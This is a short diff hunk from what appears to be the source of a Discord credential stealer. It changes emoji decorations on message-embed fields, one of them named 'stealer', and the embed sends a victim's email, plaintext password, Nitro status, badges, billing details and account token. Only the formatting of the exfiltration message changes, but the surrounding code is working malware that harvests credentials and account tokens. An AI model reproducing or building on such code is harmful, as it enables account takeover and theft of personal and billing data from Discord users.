@@ -658,17 +658,17 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Account Info**',
+            name: '<:xd:974441207595937862>  **Account Info**',
             value: `Email: **${email}** - Password: **${password}**`,
             inline: false,
           },
           {
-            name: '**Discord Info**',
+            name: '<:stealer:976937844654362744>  **Discord Info**',
             value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: false,
           },
           {
-            name: '**Token**',
+            name: '<a:plxyblackbutterfly:974638911483678753>  **Token**',
             value: `\`${token}\``,
             inline: false,
           },
